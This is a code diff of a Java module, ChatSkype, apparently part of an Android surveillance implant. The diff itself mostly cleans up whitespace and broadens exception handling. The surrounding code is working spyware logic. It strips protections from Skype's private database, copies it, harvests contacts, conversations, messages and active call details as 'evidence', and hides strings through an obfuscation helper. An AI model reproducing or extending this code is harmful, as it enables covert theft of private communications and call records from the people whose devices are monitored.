@@ -36,7 +36,7 @@ public class ChatSkype extends SubModuleChat {
 	String pObserving = M.e("com.skype");
 
 	private Date lastTimestamp;
-	
+
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
 	ChatGroups groups = new ChatSkypeGroups();
@@ -57,8 +57,8 @@ public class ChatSkype extends SubModuleChat {
 	void notifyStopProgram(String processName) {
 		try {
 			readSkypeMessageHistory();
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
+		} catch (Exception e) {
+			if (Cfg.DEBUG_SPECIFIC) {
 				Check.log(TAG + " (notifyStopProgram) Error: " + e);
 			}
 		}
@@ -66,11 +66,11 @@ public class ChatSkype extends SubModuleChat {
 
 	@Override
 	protected void start() {
-		
+
 		try {
 			readSkypeMessageHistory();
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
+		} catch (Exception e) {
+			if (Cfg.DEBUG_SPECIFIC) {
 				Check.log(TAG + " (notifyStopProgram) Error: " + e);
 			}
 		}
@@ -106,7 +106,7 @@ public class ChatSkype extends SubModuleChat {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readSkypeMessageHistory) account: " + account);
 			}
-			
+
 			long lastSkype = markup.unserialize(new Long(0));
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (start), read lastSkype: " + lastSkype);
@@ -114,13 +114,13 @@ public class ChatSkype extends SubModuleChat {
 
 			GenericSqliteHelper helper = openSkypeDBHelper(account);
 			if (helper != null) {
-				
+
 				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.SKYPE, account);
 				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
 					saveSkypeContacts(helper);
 				}
 
-				long maxLast=0;
+				long maxLast = 0;
 				List<SkypeConversation> conversations = getSkypeConversations(helper, account);
 				for (SkypeConversation sc : conversations) {
 					String peer = sc.remote;
@@ -138,11 +138,11 @@ public class ChatSkype extends SubModuleChat {
 							fetchGroup(helper, peer);
 						}
 
-						long lastTimestamp =  fetchMessages(helper, sc, lastSkype);
+						long lastTimestamp = fetchMessages(helper, sc, lastSkype);
 						maxLast = Math.max(lastTimestamp, maxLast);
 					}
 				}
-				
+
 				if (maxLast > 0) {
 					markup.serialize(maxLast);
 				}
@@ -159,7 +159,7 @@ public class ChatSkype extends SubModuleChat {
 
 	public static GenericSqliteHelper openSkypeDBHelper(String account) {
 		// k_1=/main.db
-		
+
 		if(account.contains(":")){
 			String name = account.split(":")[1];
 			File fileBaseDir = new File(dbDir);
@@ -171,7 +171,7 @@ public class ChatSkype extends SubModuleChat {
 				}
 			}
 		}
-	
+
 		String dbFile = dbDir + "/" + account + M.e("/main.db");
 		Path.unprotect(dbDir + "/" + account, true);
 		Path.unprotect(dbFile, true);
@@ -188,7 +188,7 @@ public class ChatSkype extends SubModuleChat {
 			helper = GenericSqliteHelper.openCopy(dbFile);
 			helper.deleteAtEnd = false;
 		}
-		
+
 		return helper;
 	}
 
@@ -393,19 +393,19 @@ public class ChatSkype extends SubModuleChat {
 	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
 		// select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id order by ca.id desc limit 1
 		String sqlQuery= M.e("select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id and is_active = 1 order by ca.id desc limit 1");
-		
+
 		RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
 			public long cursor(Cursor cursor) {
-				callInfo.id = cursor.getInt(0); 
+				callInfo.id = cursor.getInt(0);
 				callInfo.peer = cursor.getString(1);
 				callInfo.displayName = cursor.getString(2);
 				int type = cursor.getInt(4);
 				callInfo.timestamp = new Date(cursor.getLong(5));
 				callInfo.incoming = cursor.getInt(6) == 1;
 				callInfo.valid = true;
-				
+
 				return callInfo.id;
 			}
 		};
@@ -413,12 +413,12 @@ public class ChatSkype extends SubModuleChat {
 		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
 		return callInfo.valid;
 	}
-	
+
 	public class ChatSkypeGroups extends ChatGroups {
 
 		@Override
 		boolean isGroup(String peer) {
-			
+
 			return peer.startsWith("#");
 		}
 
